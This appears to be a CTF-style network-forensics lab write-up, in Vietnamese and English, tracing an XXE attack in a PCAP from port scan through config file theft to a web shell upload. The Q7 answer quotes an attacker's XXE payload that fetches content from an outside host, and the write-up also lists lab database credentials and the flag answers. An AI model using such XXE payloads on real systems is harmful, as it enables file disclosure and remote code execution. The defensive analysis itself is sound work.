---
title: '[Level-3]-XXE_Infiltration'
date: 2026-03-19

---

# Lab Report - XXE Infiltration  
**DatHN5 - SO3 - FSAS**

Analyze PCAP data using Wireshark to identify XXE vulnerabilities, extract compromised credentials, and detect web shell uploads for persistence. 

**Category**: Network Forensics 
**Tactics**: Reconnaissance, Initial Access, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Collection, Exfiltration 
**Tools**: Wireshark, Brim


#### Scenario
An automated alert has detected unusual XML data being processed by the server, which suggests a potential XXE (XML External Entity) Injection attack. This raises concerns about the integrity of the company's customer data and internal systems, prompting an immediate investigation.

Analyze the provided PCAP file using the network analysis tools available to you. Your goal is to identify how the attacker gained access and what actions they took.

### Write up

- Hệ thống cảnh báo phát hiện 1 vụ tấn công nghi là XXE (XML External Entity) Injection gây ảnh hưởng tới dữ liệu của cty

#### Q1 Identifying the open ports discovered by an attacker helps us understand which services are exposed and potentially vulnerable. Can you identify the highest-numbered port that is open on the victim's web server?

Qua quan sát mình thấy chỉ có 2 endpoint trong file PCAP này

![Screenshot 2026-03-18 093828](https://hackmd.io/_uploads/BJA1G5w5be.png)

![Screenshot 2026-03-18 093845](https://hackmd.io/_uploads/ByElzcPqWx.png)

Dựa vào thông tin về các gói tin của việc bắt tay ba bước mình thấy rằng IP attacker là `210.106.114.183` con IP của server bị tấn công là `50.239.151.185`
Và attacker đang mở port 39658 để quét cổng trên server

![Screenshot 2026-03-18 094549](https://hackmd.io/_uploads/SyKgzcP9bg.png)

Để biết được attacker đã tìm ra các port open trên server mình dựa vào gói tin phản hồi từ server tới attacker, gói tin có `[SYN, ACK]` gửi từ server nghĩa là port đó mở, còn `[RST, ACK]` là port đó đóng.

Lọc các gói tin có `[SYN, ACK]` qua query sau `tcp.flags.ack==1 && tcp.flags.syn==1`

![image](https://hackmd.io/_uploads/S1LkScw9Zg.png)

Kết quả mình nhận được server nạn nhân chỉ mở đúng 2 port đó là 80 và 3306, trong đó port 80 là của web, port 3306 là của mysql database

>Flag: 3306

---
#### Q2 By identifying the vulnerable PHP script, security teams can directly address and mitigate the vulnerability. What's the complete URI of the PHP script vulnerable to XXE Injection?

Để tìm ra được script `php` mà attacker dùng để khai thác XXE mình dùng query dưới để tìm ra attacker đã gửi lên server request POST nào khả nghi không.

`http.request.method==POST && ip.src==210.106.114.183`

![image](https://hackmd.io/_uploads/rJ_69qDqbe.png)

Kết quả mình thấy rằng attacker đã lợi dụng script/chức năng upload.php tải lên các file XML có chèn XXE độc hại

![image](https://hackmd.io/_uploads/r1gOoqwq-l.png)

![image](https://hackmd.io/_uploads/B1TYi9D9Wx.png)

![image](https://hackmd.io/_uploads/B17r6cPq-l.png)

-
![image](https://hackmd.io/_uploads/HJqjj9Dc-x.png)

![image](https://hackmd.io/_uploads/B1RKpcw5-l.png)

-
![image](https://hackmd.io/_uploads/Hkt6i9w5Ze.png)

![image](https://hackmd.io/_uploads/rJo065DcZx.png)

-

![image](https://hackmd.io/_uploads/H1vM35vqZl.png)

![image](https://hackmd.io/_uploads/HyXrC5DqWe.png)

Trong request trên mình thấy attacker có đề cập tới 1 file `booking.php` nên mình trace xem attacker đã là gì với file đó qua query sau `http contains "booking.php"`

Thì mình phát hiện ra rằng file `upload.php` mà attacker lợi dụng để chèn XXE thì attacker có tận dụng cả file `booking.php` để khai thác thêm thông tin của hệ thống file server

![image](https://hackmd.io/_uploads/B13lMovcZl.png)

![image](https://hackmd.io/_uploads/Hku3fjw9Zg.png)

![image](https://hackmd.io/_uploads/rJC0zsD9Wx.png)

![image](https://hackmd.io/_uploads/rJfHQsvcbl.png)


Từ các thông tin trên thì mình kết luận URI chính xác là `/reviews/upload.php` do đây là file php duy nhất có XXE chèn bởi attacker còn file `booking.php` kia là attacker lợi dụng lỗ hổng RCE để chèn command qua tham số `cmd`

>Flag: /reviews/upload.php

---
#### Q3 To construct the attack timeline and determine the initial point of compromise. What's the name of the first malicious XML file uploaded by the attacker?

Như đã phân tích ở trên mình biết rằng attacker lợi dụng chức năng `upload.php` để tải lên các file `xml` chèn XXE độc hại vaf file XML ddaauf tiên attacker tải lên đó có tên là `TheGreatGatsby.xml`

![image](https://hackmd.io/_uploads/SJYQ8ovcWx.png)

>Flag: TheGreatGatsby.xml

---
#### Q4 Understanding which sensitive files were accessed helps evaluate the breach's potential impact. What's the name of the web app configuration file the attacker read?

Trong các file XML mà attacker upload lên có 1 file chèn XXE độc hại để đọc config của web server trong file config.php

![image](https://hackmd.io/_uploads/SyxABDjw9be.png)

>Flag: config.php

---
#### Q5 To assess the scope of the breach, what is the password for the compromised database user?

Từ request chứa mã độc đọc file config mình trace xem response của server là gì thì thấy được rằng bên trong file config chứa credential truy cập database được hardcode ngay bên trong 
`$db_name = 'pageturner';`
`$db_user = 'webuser';`
`$db_pass = 'Winter2024';`

![Screenshot 2026-03-18 111904](https://hackmd.io/_uploads/SJSYlpwc-l.png)

>Flag: Winter2024

---
#### Q6 Following the database user compromise. What is the timestamp of the attacker's initial connection to the MySQL server using the compromised credentials after the exposure?

Mình biết rằng attacker biết được credential sau khi đọc file config.php khi đó là khoảng frame 88336 vậy nên mình sẽ lọc ra các frame sau đó chứ không tìm về frame trước đó.

![image](https://hackmd.io/_uploads/BJJPFpvqZx.png)


Port của MySQL database là 3306 nên mình sẽ lọc theo port để tìm các gói tin có chưa thông tin đó.

Tổng hợp lại có query sau:
`frame.number>88300 && tcp.port==3306`

![image](https://hackmd.io/_uploads/S1N3lCw9Wx.png)


Mình tìm được kết quả là attacker đã login sau khi có creadential vào lúc `May 31, 2024 12:08:49.165156000 UTC`

>Flag: 2024-05-31 12:08

---
#### Q7 To eliminate the threat and prevent further unauthorized access, can you identify the name of the web shell that the attacker uploaded for remote code execution and persistence?

Để xem attacker đã upload web shell nào lên server mình lọc xem các gói tin thuộc loại Request với query sau `frame.number>88300 && http.request` 

![image](https://hackmd.io/_uploads/H1xMF0wqbe.png)


MÌnh thấy ở 1 lần chèn XXE độc hại attacker đã chèn command sau

```!
<! DOCTYPE foo [
    <! ELEMENT foo ANY >
    <! ENTITY payload SYSTEM "http://203.0.113.15/booking.php">
    <! ENTITY % internals " <! ENTITY file SYSTEM 'php://filter/read=convert.base64-encode/resource=%payload;'>
    ">]>\n
    <foo>
        &file;
        </foo>
```

- Khi xử lý file XML, server sẽ kết nối đến địa chỉ của attacker **(http://203.0.113.15/booking.php)** và lấy nội dung trả về, lưu vào biến `%payload`.
- Sau đó nội dung ở trong biến %payload được convert sang base64, sau cùng được lưu vào file

![image](https://hackmd.io/_uploads/Hy6N0CPqWe.png)

File booking.php sau đó được attacker lợi dụng để thực thi RCE - Command Injection

>Flag: booking.php